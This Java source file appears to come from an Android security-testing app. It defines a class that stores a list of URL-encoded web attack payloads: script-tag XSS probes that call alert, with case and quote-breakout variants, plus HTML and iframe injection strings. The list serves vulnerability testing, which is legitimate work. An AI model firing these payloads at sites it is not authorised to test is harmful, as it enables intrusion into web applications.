package com.example.laxba.testapp.PaySig;

/**
 * Created by laxba on 11/15/2019.
 */
public class psXSS {

    private static String[] arrPayXSS;

    public psXSS() {
        loadDataXSS();
    }


    public void loadDataXSS() {
        arrPayXSS = new String[]{
                //XSS
                "%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E",
                "%3CScRipT%3Ealert%28%22XSS%22%29%3B%3C%2FScRipT%3E",
                "%3Cscript%3Ealert%28123%29%3C%2Fscript%3E",
                "%3Cscript%3Ealert%28%22hellox+worldss%22%29%3B%3C%2Fscript%3E",
                "%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E+",
                "+%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E+",
                "%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E",
                "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
                "%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E",
                "%3Cscript%3Ealert%28%2FXSS%22%29%3C%2Fscript%3E",
                "%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E",
                "%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
                "%27%3B+alert%281%29%3B",

                //HTML Injection
                "%3Ch1%3ELow1234%3C%2Fh1%3E",

                //IFrame Injection
                "%3Ciframe%3E%3Ch1%3ETest12345%3C%2Fh1%3E%3C%2Fiframe%3E",
        };
    }

    public String[] getArrPayXSS() {
        return arrPayXSS;
    }
}
